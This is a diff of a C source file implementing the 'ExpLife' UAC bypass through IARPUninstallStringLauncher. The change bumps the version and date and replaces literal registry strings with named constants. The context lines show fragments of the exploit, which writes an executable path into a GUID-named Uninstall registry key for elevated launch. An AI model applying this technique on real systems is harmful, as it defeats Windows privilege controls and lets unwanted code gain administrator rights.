@@ -4,9 +4,9 @@
 *
 *  TITLE:       EXPLIFE.C
 *
-*  VERSION:     2.87
+*  VERSION:     2.90
 *
-*  DATE:        19 Jan 2018
+*  DATE:        19 July 2018
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -104,7 +104,7 @@ BOOL ucmUninstallLauncherMethod(
         if (CoCreateGuid(&guid) != S_OK)
             break;
 
-        _strcpy(szKeyName, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"));
+        _strcpy(szKeyName, T_UNINSTALL);
         if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {
             _strcat(szKeyName, szGuid);
 
@@ -115,7 +115,7 @@ BOOL ucmUninstallLauncherMethod(
                 break;
 
             cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
-            lResult = RegSetValueEx(hKey, TEXT("UninstallString"), 0, REG_SZ, (BYTE*)lpszExecutable,
+            lResult = RegSetValueEx(hKey, T_UNINSTALL_STRING, 0, REG_SZ, (BYTE*)lpszExecutable,
                 (DWORD)cbData);
 
             if (lResult != ERROR_SUCCESS)
